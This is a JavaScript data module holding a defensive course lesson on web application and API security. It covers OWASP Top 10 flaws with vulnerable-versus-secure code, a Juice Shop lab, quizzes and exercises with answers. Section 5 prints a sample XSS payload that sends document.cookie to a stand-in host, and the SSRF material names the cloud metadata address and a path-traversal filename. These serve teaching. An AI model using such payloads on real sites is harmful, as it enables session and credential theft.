export default {
  n: 6,
  title: 'Web Application & API Security',
  description: 'Web architecture and HTTP, headers, cookies and sessions, authentication and authorization, the OWASP Top 10, SQL injection, XSS, CSRF, broken access control and IDOR, SSRF, file uploads, API security, and testing and remediation with an intercepting proxy in safe local labs.',
  intro: 'Web applications are the most exposed part of most organizations. The login page, the payment form and the mobile app’s API are all reachable by anyone on the Internet, at any hour. It is like a bank branch whose front door is open to the whole country: the staff at the counter must check every request, because anyone can walk in. Most serious breaches you read about involve a web flaw somewhere in the chain.\n\nThis module explains how these flaws arise and, above all, how to fix them. You will read HTTP requests like a tester, understand the OWASP Top 10, compare vulnerable and secure code side by side, and learn to secure REST APIs. Each topic ends with a defense you can apply in your own projects.\n\nAll practice uses your own applications or intentionally vulnerable training apps such as OWASP Juice Shop, DVWA, WebGoat and the PortSwigger Web Security Academy. Never test a real site without written permission. Testing someone else’s site "just to check" can still be a crime.',
  objectives: [
    'Explain client-server architecture, HTTP messages, headers, cookies and sessions.',
    'Describe authentication, authorization and session management.',
    'Explain the OWASP Top 10 and the main vulnerabilities with vulnerable vs secure examples.',
    'Secure REST APIs against the OWASP API Security Top 10 themes.',
    'Use an intercepting proxy in a lab and write clear remediation advice.'
  ],
  terms: [
    ['HTTP request / response', 'The messages a browser and server exchange: method, path, headers and body, then a status code and body.'],
    ['Session', 'Server-side state for a logged-in user, identified by a random ID in a cookie.'],
    ['HttpOnly / Secure / SameSite', 'Cookie flags: hide from JavaScript / send only over HTTPS / limit cross-site sending.'],
    ['OWASP Top 10', 'The best-known list of the most critical web application security risks.'],
    ['SQL injection', 'Input that becomes part of a database command.'],
    ['XSS', 'Cross-site scripting: untrusted input runs as script in another user’s browser (stored, reflected or DOM-based).'],
    ['CSRF', 'Cross-site request forgery: a malicious site makes the victim’s browser send a request with their cookies.'],
    ['IDOR', 'Insecure Direct Object Reference: changing an ID in a request returns someone else’s data.'],
    ['SSRF', 'Server-side request forgery: the server is tricked into fetching an attacker-chosen URL.'],
    ['JWT', 'JSON Web Token: a signed token carrying claims. Verify signature, algorithm, expiry, audience and issuer.'],
    ['WAF', 'Web Application Firewall: filters HTTP traffic for known attack patterns.'],
    ['SAST / DAST', 'Static (source code) and dynamic (running app) application security testing.']
  ],
  diagramTitle: 'Where web attacks hit a request',
  ascii: '  Browser (HTML/JS, cookies)          attacker controls EVERYTHING here\n      |  HTTPS request  GET /api/orders/7   Cookie: session=...\n      v\n  [ WAF / rate limit ]  <- blocks known patterns, throttles brute force\n      v\n  [ App server ]\n      1 authenticate   -> who is this?      (A07)\n      2 authorize      -> may they read order 7?   (A01, IDOR)\n      3 validate input -> type, length, allow-list (A03)\n      4 query DB with PARAMETERS               (SQL injection)\n      5 fetch URLs only from an allow-list     (A10 SSRF)\n      6 encode output + CSP header             (XSS)\n      7 log security events                    (A09)\n      v\n  [ Database / internal services / cloud metadata ]',
  diagramExplain: 'Anything in the browser can be changed by the user, so every real check happens on the server, in order: authenticate, authorize per object, validate input, parameterize queries, restrict outbound requests, encode output, and log.',
  sections: [
    {
      h: '1. Web architecture and HTTP',
      t: 'A web application has two halves. The browser shows the page using HTML, CSS and JavaScript. The server runs the application code and talks to the database. The two talk to each other over HTTP, or HTTPS when the connection is encrypted. It works a bit like ordering at a college canteen counter: you hand over a slip, the kitchen decides what to give you, and the slip only says what you asked for.\n\nEvery exchange is a request and a response. The browser sends a method (GET to read, POST to send data), a path such as /api/orders/7, and headers such as Host, Cookie and Accept. The server replies with a status code (200 OK, 404 Not found and so on), its own headers and a body, often JSON. HTTP itself has no memory, so the server recognizes you through the session cookie your browser sends with each request.\n\nThe main rule is: never trust the client. Anything in the browser, including hidden fields, prices and roles, can be modified by the user. With the browser’s developer tools or a proxy, anyone can change "price": 499 to "price": 1 before the request leaves the laptop. If the server simply accepts that number, the shop sells a book for one rupee.\n\nSo the server must recalculate prices, check roles and validate every value itself. The browser is there for display and convenience. Decisions belong on the server.',
      code: 'GET /api/orders/7 HTTP/1.1\nHost: shop.example\nCookie: session=abc123\nAccept: application/json\n\nHTTP/1.1 200 OK\nContent-Type: application/json\nSet-Cookie: session=...; HttpOnly; Secure; SameSite=Lax\n\n{"id": 7, "item": "book", "price": 499}',
      lang: 'http',
      table: [
        ['Status', 'Meaning'],
        ['200 / 201', 'OK / Created'],
        ['301 / 302', 'Redirects'],
        ['400', 'Bad request'],
        ['401 / 403', 'Not authenticated / Not allowed'],
        ['404', 'Not found'],
        ['500', 'Server error (never leak details to the user)']
      ]
    },
    {
      h: '2. Security headers, cookies and sessions',
      t: 'Security headers are short instructions that the server sends to the browser along with each page. Cookie flags are similar instructions attached to a cookie. They cost almost nothing to add, yet they give cheap, powerful defense in depth: an extra layer that still helps when some other control fails. Think of the extra latch on a hostel room door. It does not replace the main lock, but it stops anyone who gets past it.\n\nEach header tells the browser to refuse something risky. Content-Security-Policy lists which sources may supply scripts, so a script injected from somewhere else is blocked. Strict-Transport-Security tells the browser to always use HTTPS for the site, so an attacker on public Wi-Fi cannot quietly downgrade the connection to plain HTTP. X-Content-Type-Options: nosniff stops the browser from guessing a file’s type and running a text file as a script.\n\nCookies carry your session, so they need the same care. HttpOnly means JavaScript on the page cannot read the cookie, so a script injected through XSS cannot steal it. Secure means the cookie is sent only over HTTPS. SameSite=Lax or Strict stops the browser from attaching the cookie to most requests started by other sites, which blocks many CSRF attacks. A good session cookie looks like this: Set-Cookie: session=...; HttpOnly; Secure; SameSite=Lax.\n\nYou can check any site you build: open developer tools, select the Network tab and read the response headers. Missing headers are one of the easiest findings to fix.',
      table: [
        ['Header / flag', 'Protects against'],
        ['Content-Security-Policy', 'XSS and unwanted resource loading'],
        ['Strict-Transport-Security', 'Downgrade to HTTP'],
        ['X-Content-Type-Options: nosniff', 'MIME sniffing'],
        ['HttpOnly cookie', 'JavaScript reading the session cookie'],
        ['Secure cookie', 'Sending the cookie over plain HTTP'],
        ['SameSite=Lax / Strict', 'Many CSRF attacks']
      ]
    },
    {
      h: '3. Authentication, authorization and tokens',
      t: 'Authentication and authorization sound alike, but they answer different questions. Authentication asks who you are. Authorization asks what you may do. In a college exam hall, the invigilator first checks your ID card (authentication), then checks that your roll number is on the list for this room (authorization). Passing the first check does not mean you may sit anywhere.\n\nOn a website, authentication usually happens once, at login, with a password and ideally a second factor. The server then gives you a session ID or a token. Authorization must happen again and again: on the server, per request and per object, with default deny. Every request is checked, every record is checked against the logged-in user, and anything not clearly allowed is refused.\n\nTokens such as JWTs, and protocols such as OAuth 2.0 and OpenID Connect (OIDC), carry identity between systems. A JWT is signed, not encrypted, so anyone who holds it can read what is inside. Before trusting it, the server must verify the signature and the algorithm, and check the expiry, audience and issuer. The bullets below list the matching rules for passwords, sessions and tokens.\n\nA common mistake is checking only "is the user logged in?" and stopping there. A logged-in student should still not be able to open the admin page or another student’s marks. Logged in is not the same as allowed.',
      b: [
        'Hash passwords with Argon2id or bcrypt, enforce MFA, rate-limit and lock out, give generic login errors, and rotate the session ID after login.',
        'Sessions: long random identifiers that expire on idle and absolute time and are invalidated on logout and password change.',
        'Tokens (JWT, OAuth 2.0 / OIDC): verify signature and algorithm, check expiry, audience and issuer, keep them short-lived, and never put secrets in them.'
      ]
    },
    {
      h: '4. The OWASP Top 10 (2021)',
      t: 'OWASP, the Open Worldwide Application Security Project, is a nonprofit community that publishes free guides and tools for web security. Its best-known document is the Top 10: a list of the most serious and common categories of web application risk. Think of it like the list of common accident causes that traffic police publish. It does not cover every possible problem, but it shows where most of the damage comes from.\n\nThe list is built from data that testing companies contribute and from a community survey. Each entry is a category, not a single bug. For example, A03 Injection includes SQL injection, OS command injection and XSS. The table shows each category with its core fix. The 2021 edition put Broken Access Control at number one because it was found in more of the tested applications than any other category.\n\nYou can use the list as a checklist when you build or review a project. Before you submit your college project, ask: are access checks done on the server? Are passwords hashed? Are queries parameterized? Are libraries up to date? Are errors logged without leaking details to the user?\n\nOWASP revises the list periodically, so check owasp.org/Top10 for the current edition. Interviewers often ask about it, and they prefer a student who can explain one category and its fix in depth over one who only recites ten names.',
      table: [
        ['#', 'Category', 'Core fix'],
        ['A01', 'Broken Access Control', 'Server-side checks on every object and function'],
        ['A02', 'Cryptographic Failures', 'TLS, strong algorithms, protect secrets and personal data'],
        ['A03', 'Injection (SQL, OS, XSS)', 'Parameterize, encode output, validate input'],
        ['A04', 'Insecure Design', 'Threat modeling and secure design patterns'],
        ['A05', 'Security Misconfiguration', 'Hardened defaults, patching, remove debug features'],
        ['A06', 'Vulnerable Components', 'Inventory (SBOM), update and scan dependencies'],
        ['A07', 'Identification & Auth Failures', 'MFA, rate limiting, safe sessions'],
        ['A08', 'Software & Data Integrity Failures', 'Signed updates, safe CI/CD, safe deserialization'],
        ['A09', 'Logging & Monitoring Failures', 'Log security events and alert on them'],
        ['A10', 'SSRF', 'Allow-list outbound targets, network isolation']
      ]
    },
    {
      h: '5. SQL injection and XSS: vulnerable vs secure',
      t: 'SQL injection and cross-site scripting (XSS) come from the same root mistake: the program mixes data with code. Picture a bank clerk who reads whatever is written on your deposit slip as an instruction. If the slip says "and also open locker 12", the clerk does it. A program should treat user input only as data, never as part of a command.\n\nIn SQL injection, input becomes part of the command. If code builds a query by joining strings, such as "SELECT * FROM users WHERE name = \'" + name + "\'", then special characters inside name can change the meaning of the query. The result can be data theft, tampering and sometimes full server compromise. The fix is to parameterize queries: the query has a placeholder, and the database driver sends the value separately, so it can never become SQL.\n\nIn XSS, untrusted input is rendered as active HTML or JavaScript in another user’s browser. A comment box that stores a script tag will run that script for every visitor, leading to session theft or actions as the victim. The code example shows the fix: html.escape turns < and > into &lt; and &gt;, so the comment is shown as harmless text instead of running.\n\nThe full set of fixes: encode output for its context (HTML body, attribute, JavaScript, URL), use frameworks with auto-escaping such as React or Django templates, and avoid innerHTML and dangerouslySetInnerHTML. Add a Content-Security-Policy and HttpOnly cookies as backup layers. Practice these only in labs such as DVWA or Juice Shop.',
      code: 'import html\n\ncomment = \'<script>fetch("https://evil.example/?c=" + document.cookie)</script>\'\n\nunsafe_page = "<p>" + comment + "</p>"            # the script would run\nsafe_page = "<p>" + html.escape(comment) + "</p>"  # shown as harmless text\n\nprint("UNSAFE:", unsafe_page)\nprint("SAFE:  ", safe_page)',
      lang: 'python'
    },
    {
      h: '6. CSRF',
      t: 'Cross-site request forgery (CSRF) tricks your own browser into doing something on a site where you are already logged in. Think of a signed blank cheque left on your desk. Someone else fills in the amount, and the bank pays because the signature is real. In CSRF, the "signature" is your session cookie.\n\nHere is how it works. If a site authenticates with cookies, a malicious page can make the victim’s browser submit a form to that site, and the browser attaches the cookie automatically. Say you are logged in to your college portal in one tab. In another tab you open a page that quietly submits a hidden form to the portal’s "change email" address. The portal sees a valid cookie and makes the change. You never clicked anything on the portal.\n\nDefenses: anti-CSRF tokens tied to the session, SameSite cookies, checking the Origin header, and requiring re-authentication for sensitive actions. An anti-CSRF token is a random value the server puts inside its own forms. The malicious page cannot read it, so its forged request fails. Asking for the password again before changing an email address or making a payment adds one more barrier, much like UPI asking for your PIN on every payment.\n\nSameSite=Lax alone is not complete. It still allows top-level GET navigations, and state-changing GET endpoints remain exposed. So never change data with a GET request. Use POST, PUT or DELETE, and protect them with a token.'
    },
    {
      h: '7. Broken access control and IDOR',
      t: 'Broken access control is the most common serious web flaw. The root problem is that the server trusts the ID in the request. When that ID points straight to an object, such as an order or a marksheet, the flaw is called IDOR: insecure direct object reference. Think of a railway cloakroom that hands over any bag to anyone who reads out a token number, without looking at the slip in their hand.\n\nLook at the code example. Order 7 belongs to Asha and order 8 belongs to Ravi. The vulnerable function returns whatever order ID it receives. So if Asha is logged in and asks for order 8, she sees Ravi’s laptop order. The secure function first loads the order, then checks that its owner matches the logged-in user, and returns "403 Forbidden" if the order is missing or belongs to someone else.\n\nFix it by checking ownership on the server for every object. Hiding the link or using a hard-to-guess ID helps a little, but it is not a control: IDs leak through emails, logs and shared screenshots. The ownership check is what actually protects the data.\n\nThen add automated tests that prove one user cannot read another’s data. A simple test logs in as Asha, requests Ravi’s order and expects a refusal. If someone removes the check by mistake later, the test fails before the code reaches production.',
      code: 'ORDERS = {7: {"owner": "asha", "item": "book"}, 8: {"owner": "ravi", "item": "laptop"}}\n\ndef get_order_vulnerable(user, order_id):\n    return ORDERS.get(order_id)              # trusts the ID in the request\n\ndef get_order_secure(user, order_id):\n    order = ORDERS.get(order_id)\n    if order is None or order["owner"] != user:\n        return "403 Forbidden"               # ownership checked on the server\n    return order\n\nprint("asha asks for 8 (vulnerable):", get_order_vulnerable("asha", 8))\nprint("asha asks for 8 (secure):    ", get_order_secure("asha", 8))\nprint("asha asks for 7 (secure):    ", get_order_secure("asha", 7))',
      lang: 'python'
    },
    {
      h: '8. SSRF and file uploads',
      t: 'Server-side request forgery (SSRF) turns the server into a messenger for the attacker. Many apps have a feature such as "fetch this image URL": you give a link and the server downloads the image for you. The problem is that the server sits inside the organization’s network, so it can reach places outsiders cannot. It is like a visitor asking the apartment security guard to fetch something from a flat the visitor is not allowed to enter.\n\nIn SSRF, a feature such as "fetch this image URL" is abused to make the server request internal addresses, for example the cloud metadata service at 169.254.169.254, which can hand out credentials. In AWS, a server that fetches that address on someone else’s behalf may return temporary keys for its cloud role. Defend by allow-listing destinations, blocking internal ranges, isolating the fetcher, and requiring IMDSv2 in AWS. IMDSv2 first needs a session token from a separate PUT request, which a simple forged request cannot obtain.\n\nFile uploads are a related risk, because the server again handles something the user controls. They are risky when they accept executable scripts, huge files, malware or path traversal in file names. A profile-photo upload that accepts a file named ../../config.php, or a .php file that the web server later runs, can lead to full compromise.\n\nThe bullets list the defenses. The key idea: treat every uploaded file as untrusted, rename it, store it away from your code, and never run it.',
      b: [
        'Allow-list extensions and verify the real content type.',
        'Generate random file names and store files outside the web root or in object storage.',
        'Set size limits and scan uploads for malware.',
        'Serve files with Content-Disposition and a safe content type, and never execute uploads.'
      ]
    },
    {
      h: '9. API security',
      t: 'An API (application programming interface) is how apps talk to servers without a web page in between. When you open a food delivery app, it calls an API to list restaurants, place the order and show its status. REST APIs expose objects by URL, such as /api/users/42/orders. Each URL is like a numbered locker in a bank, and the API must check the customer’s key for every single locker.\n\nBecause objects are addressed directly, Broken Object Level Authorization (BOLA) is the top risk in the OWASP API Security Top 10. It is the API version of IDOR: change 42 to 43 and, if the server does not check ownership, you get someone else’s data. Other themes: broken authentication, excessive data exposure, missing rate limits, mass assignment, misconfiguration, forgotten old API versions and unsafe consumption of third-party APIs.\n\nTwo of these need a closer look. Excessive data exposure means the API returns a full user record, including phone number and address, and relies on the app to hide some fields. Anyone who reads the raw response sees everything. Mass assignment means the API copies every field from the request into the database, so a user who adds "role": "admin" to a profile update becomes an admin.\n\nOld versions are a quiet risk too. If /api/v2 is fixed but /api/v1 still runs without the fix, attackers simply call v1. Keep an inventory of every API and retire what you no longer need.',
      b: [
        'Authenticate every call; use OAuth 2.0 scopes and short-lived tokens.',
        'Return only the fields needed; never trust client-supplied roles or IDs.',
        'Rate-limit and throttle; set payload size limits.',
        'Validate against a schema (OpenAPI) and reject unknown fields to stop mass assignment.',
        'Version and retire APIs, keep an inventory, and log and monitor.'
      ]
    },
    {
      h: '10. Security testing and remediation',
      t: 'Finding security flaws is not one tool or one day of work. Good teams combine several methods, and each one catches what the others miss. It is like a full health check-up: a blood test, an X-ray and a doctor’s examination each find different problems, and no hospital relies on just one.\n\nCombine threat modeling, SAST, DAST, dependency scanning, code review and manual testing. Threat modeling happens at design time: you draw the system and ask what could go wrong. SAST (code scanning) reads source code for risky patterns, such as SQL built from strings. DAST (running-app scanning) sends requests to a running application and studies the responses. Dependency scanning checks your libraries against known vulnerabilities, for example with npm audit or GitHub Dependabot. Code review and manual testing catch logic flaws that tools do not understand.\n\nManual testing uses an intercepting proxy such as Burp Suite or OWASP ZAP. It sits between your browser and the app, so you can view and change each request. Always use these tools against authorized targets: your own app or a training lab such as Juice Shop.\n\nA good finding states the issue, severity, evidence and a specific fix. "Security is weak" helps nobody. "Orders readable by changing the ID, High, add an ownership check on the server and automated tests" tells the developer exactly what to do, as the table shows.',
      table: [
        ['Finding', 'Severity', 'Remediation'],
        ['Orders readable by changing the ID', 'High', 'Add an ownership check on the server; add automated tests'],
        ['Missing CSP and HSTS', 'Medium', 'Add the headers; test CSP in report-only mode first'],
        ['Directory listing at /ftp/', 'Medium', 'Disable listing; remove unneeded files']
      ]
    }
  ],
  lab: {
    title: 'Hands-on Lab 06: a local training app and a headers audit',
    steps: [
      ['Run OWASP Juice Shop locally in Docker (never on a shared network).', 'docker run --rm -p 3000:3000 bkimminich/juice-shop\n# then open http://localhost:3000', 'Juice Shop is intentionally vulnerable and made for practice. Stop the container when you finish.'],
      ['Set up an intercepting proxy (Burp Suite Community or OWASP ZAP), point your browser at it, and browse the app.', null, 'Study the request history: which requests carry IDs, tokens or prices? Those are the first places to test authorization.'],
      ['Work through the beginner SQL injection, XSS and access control challenges, then read the fix for each.', null, 'Write down the root cause and the server-side fix for each, not just the payload.'],
      ['Audit security headers on a site you own.', 'curl -s -D - -o /dev/null https://your-own-site.example | grep -iE "content-security|strict-transport|x-content-type|set-cookie"', 'Missing headers become medium findings; cookies without HttpOnly, Secure and SameSite are worth fixing too.']
    ]
  },
  examples: [
    {
      title: 'An allow-list check that blocks SSRF to internal addresses',
      lang: 'python',
      code: 'import ipaddress\nfrom urllib.parse import urlparse\n\nALLOWED_HOSTS = {"images.example-cdn.com"}\n\ndef is_safe_url(url):\n    p = urlparse(url)\n    if p.scheme != "https" or p.hostname not in ALLOWED_HOSTS:\n        return False\n    return True\n\nfor url in ["https://images.example-cdn.com/a.png",\n            "http://169.254.169.254/latest/meta-data/",\n            "https://localhost:8080/admin",\n            "https://evil.example/x.png"]:\n    print(f"{url:45} -> {\'allowed\' if is_safe_url(url) else \'blocked\'}")',
      explanation: 'An allow-list of exact hosts is far stronger than trying to block “bad” addresses. Production code should also resolve the host and refuse private and link-local IPs, because DNS can point an allowed-looking name at an internal address.'
    },
    {
      title: 'Generic login errors and rate limiting',
      lang: 'python',
      code: 'import time\n\nFAILS = {}\nLIMIT, WINDOW = 5, 300          # 5 failures per 5 minutes\n\ndef login(user, password_ok):\n    now = time.time()\n    recent = [t for t in FAILS.get(user, []) if now - t < WINDOW]\n    if len(recent) >= LIMIT:\n        return "Too many attempts. Try again later."\n    if not password_ok:\n        FAILS[user] = recent + [now]\n        return "Invalid username or password."   # same message for both cases\n    FAILS[user] = []\n    return "Welcome!"\n\nfor attempt in range(7):\n    print(attempt + 1, login("asha", password_ok=False))',
      explanation: 'One generic message stops attackers from learning which usernames exist, and the limit makes credential stuffing slow. Real systems also add MFA and breached-password checks.'
    }
  ],
  best: [
    'Enforce authorization on the server for every object and function, with default deny.',
    'Parameterize every query and encode every output for its context.',
    'Set CSP, HSTS, nosniff and HttpOnly + Secure + SameSite cookies.',
    'Use MFA, rate limiting and generic login errors; rotate the session ID after login.',
    'Allow-list outbound URLs, upload types and API fields.',
    'Keep a dependency inventory and patch components quickly.'
  ],
  mistakes: [
    'Relying on client-side validation or hidden form fields for security.',
    'Checking that the user is logged in but not that they own the object (IDOR).',
    'Accepting JWTs without verifying the signature and algorithm, or with very long lifetimes.',
    'Showing stack traces and SQL errors to users.',
    'Leaving old API versions and debug endpoints running.'
  ],
  exercise: {
    title: 'Practice exercises',
    problem: '1. Explain the difference between authentication and authorization with one example.\n2. Why does client-side validation never replace server-side validation?\n3. Describe how a parameterized query prevents injection.\n4. List three defenses against XSS and the layer each works at.\n5. Why is SameSite=Lax not a complete CSRF defense by itself?\n6. Draft a remediation note for a finding where users can view each other’s orders.'
  },
  mini: {
    title: 'Mini project: a secure orders API',
    objective: 'Build, attack and fix a small API in a local lab.',
    requirements: [
      'Flask or Express API with login, sessions, an orders endpoint, rate limiting and security headers.',
      'A test suite proving users cannot read each other’s orders.',
      'Run OWASP ZAP against it locally and fix every finding.'
    ],
    deliverable: 'A three-page report with before/after findings, plus the repository with tests.'
  },
  takeaways: [
    'Never trust client input or client-side checks.',
    'Broken access control is the top web risk: check ownership on the server for every object.',
    'Injection and XSS have well-known fixes: parameterize, encode, validate.',
    'Headers, cookie flags and session handling are part of the defense.',
    'Test only what you own or may legally test.'
  ],
  quickRef: [
    'A01 access control · A02 crypto · A03 injection · A05 misconfig · A06 components · A10 SSRF',
    'Cookie: HttpOnly; Secure; SameSite=Lax',
    'Headers: Content-Security-Policy · Strict-Transport-Security · X-Content-Type-Options: nosniff',
    'IDOR fix: if order.owner != current_user → 403',
    'JWT: verify sig + alg, exp, aud, iss; short-lived'
  ],
  refs: [
    ['OWASP Top 10', 'https://owasp.org/Top10/'],
    ['OWASP API Security Top 10', 'https://owasp.org/API-Security/'],
    ['OWASP Cheat Sheet Series', 'https://cheatsheetseries.owasp.org/'],
    ['PortSwigger Web Security Academy (free labs)', 'https://portswigger.net/web-security'],
    ['MDN Web Docs: HTTP security', 'https://developer.mozilla.org/en-US/docs/Web/Security']
  ],
  quiz: [
    ['Which fix best prevents SQL injection?', ['Hiding errors', 'Parameterized queries', 'Client-side validation', 'Using POST only'], 1, 'Parameters keep input out of the SQL command structure.'],
    ['Which cookie flag stops JavaScript from reading a cookie?', ['Secure', 'HttpOnly', 'Path', 'Domain'], 1, 'HttpOnly blocks script access, reducing the impact of XSS.'],
    ['IDOR is an example of:', ['Broken access control', 'Weak TLS', 'Misconfigured DNS', 'Malware'], 0, 'A missing ownership check is broken access control (A01).'],
    ['SSRF is when:', ['The server is tricked into making requests', 'A user is tricked into clicking a link', 'A cookie expires', 'CSS fails to load'], 0, 'The server fetches attacker-chosen URLs, often internal ones.'],
    ['Where must authorization checks happen?', ['In the browser', 'On the server', 'In the CSS', 'In the URL'], 1, 'Only the server is trusted; clients can be modified.']
  ],

  skills: ['Read HTTP requests and responses', 'Map flaws to the OWASP Top 10', 'Fix SQL injection, XSS and IDOR', 'Secure cookies, sessions and APIs', 'Write remediation notes'],
  prereq: ['Module 02 (HTTP and TLS)', 'Module 04 (SQL and input validation)', 'Module 05 (hashing and tokens)'],
  analogy: 'A web app is a bank counter. The customer (browser) can write anything on the request slip, so the teller (server) must check the customer’s ID (authentication), check the account belongs to them (authorization), and never let the slip’s wording become an instruction to the vault (injection).',
  why: 'Web apps and APIs are the front door of almost every business. Developers, testers, SOC analysts and cloud engineers all need to recognize these flaws in code, traffic and logs.',
  workflow: {
    title: 'Testing and fixing a web finding',
    nodes: [
      ['scope', 'Confirm scope', 'Written permission', 'Target list', 'Rules of engagement', 'Test only the app and environment you are authorized for, at the agreed times. For practice, use Juice Shop, DVWA or your own app.'],
      ['map', 'Map the app', 'Proxy history', 'Browsing', 'Endpoints and parameters', 'Browse every feature through Burp or ZAP. List endpoints that take IDs, file names, URLs or free text: those are where access control, injection and SSRF live.'],
      ['test', 'Test a hypothesis', 'Change one thing', 'A request', 'Behavior', 'For example, replay GET /api/orders/7 as another user, or change 7 to 8. If you see someone else’s data, you have an IDOR.'],
      ['evidence', 'Record evidence', 'Request + response', 'Result', 'Finding', 'Save the exact request and response, the accounts used and the time. Avoid touching real customer data beyond what proves the issue.'],
      ['fix', 'Recommend the fix', 'Root cause', 'Finding', 'Remediation', 'Name the root cause (missing ownership check) and the specific server-side fix, plus a test that proves it.'],
      ['retest', 'Retest', 'Verify the fix', 'Patched app', 'Closed finding', 'Repeat the same request after the fix. The finding is closed only when the test passes and the regression test is in the pipeline.']
    ],
    explanation: 'Good testers spend as much effort on clear evidence and fixes as on finding the bug.'
  },
  caseStudy: {
    title: 'SSRF and cloud credentials (Capital One, 2019)',
    problem: 'A misconfigured web application firewall in the cloud could be made to send requests on an attacker’s behalf.',
    data: 'Requests to the instance metadata service, cloud API calls from an unusual source, storage access logs.',
    steps: ['An SSRF request reached the cloud metadata service.', 'The metadata service returned temporary credentials for the instance’s role.', 'The role had broad permissions to storage buckets.', 'Customer data was copied out of storage.'],
    result: 'Hardening SSRF paths, requiring IMDSv2, least-privilege roles and monitoring unusual access each break the chain.',
    limitations: 'Simplified summary; read primary sources for details.'
  },
  exercises: [
    { title: 'Name the flaw', objective: 'Recognize IDOR.', problem: 'While logged in as user A, you change /invoices/1001 to /invoices/1002 and see user B’s invoice. Which OWASP category is this?', options: ['A01 Broken Access Control', 'A02 Cryptographic Failures', 'A05 Security Misconfiguration', 'A09 Logging Failures'], answer: 0, hints: ['The server did not check ownership.'], solution: ['The server authenticated A but did not check that invoice 1002 belongs to A.'], explanation: 'Fix with a server-side ownership check on every object.' },
    { title: 'Pick the XSS defense', objective: 'Choose the right layer.', problem: 'Which change most directly stops stored XSS in a comments feature?', options: ['Longer session IDs', 'HTML-encoding comments when they are displayed', 'Using HTTPS', 'Hiding the comment box'], answer: 1, hints: ['The problem is markup being executed.'], solution: ['Encoding turns < and > into harmless text.'], explanation: 'CSP and HttpOnly add defense in depth on top.' },
    { title: 'Which header forces HTTPS?', type: 'Short answer', objective: 'Know security headers.', problem: 'Which response header tells browsers to use HTTPS only for a site in the future?', accept: ['strict-transport-security', 'hsts', 'strict transport security'], hints: ['Its short name is HSTS.'], solution: ['Strict-Transport-Security: max-age=31536000; includeSubDomains'], explanation: 'It prevents downgrade to HTTP after the first visit.' },
    { title: 'Mass assignment', difficulty: 'Intermediate', objective: 'Spot API over-trust.', problem: 'A sign-up API saves every JSON field it receives. An attacker adds "role": "admin". Which defense stops this?', options: ['Rate limiting', 'Schema validation that rejects unknown or protected fields', 'TLS 1.3', 'A longer password'], answer: 1, hints: ['Who should decide the role?'], solution: ['Validate against a schema and set role on the server only.'], explanation: 'Never trust client-supplied roles or IDs.' }
  ],
  checks: [
    ['What does SameSite=Lax mainly help against?', ['SQL injection', 'Many CSRF attacks', 'Brute force', 'DDoS'], 1, 'It stops cookies being sent on most cross-site requests.'],
    ['Which status code means “not authenticated”?', ['401', '403', '404', '500'], 0, '401 = not authenticated; 403 = authenticated but not allowed.'],
    ['What is the top risk in the OWASP API Security Top 10?', ['Broken Object Level Authorization', 'Weak TLS', 'Slow responses', 'Large images'], 0, 'APIs expose objects by ID, so object-level checks matter most.']
  ],
  cheat: ['Never trust the client', 'Authorize every object on the server', 'Parameterize · Encode · Validate', 'CSP · HSTS · nosniff · HttpOnly Secure SameSite', 'Allow-list URLs, uploads and fields'],
  next: 'Module 07 brings these skills into a full, authorized penetration test: scoping, reconnaissance, exploitation in labs and reporting.'
};
